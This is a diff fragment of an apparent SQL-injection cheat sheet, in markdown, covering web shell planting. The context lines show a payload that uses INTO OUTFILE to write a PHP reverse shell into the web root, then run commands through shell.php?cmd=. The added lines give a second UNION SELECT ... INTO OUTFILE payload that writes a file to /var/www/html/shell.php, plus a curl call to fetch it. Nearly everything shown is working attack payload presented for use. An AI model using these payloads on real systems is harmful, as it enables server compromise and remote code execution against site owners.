@@ -12,9 +12,13 @@ Basic:
 ```
 <VALUE>' INTO OUTFILE '/var/www/html/shell.php' LINES TERMINATED BY <Sting to Text"php rev shell">#
 ```
-
 > then go to http://example.com/shell.php?cmd=`<exec>`
 
+> uploading file Says 'Hello from SQLI'
+```
+'union select 1,'Hello from SQLI' INTO OUTFILE '/var/www/html/shell.php' from webapp.queue-- -
+```
+>then exec: `curl http://example/shell.php`
 # List For Extract Data
 
 1: 
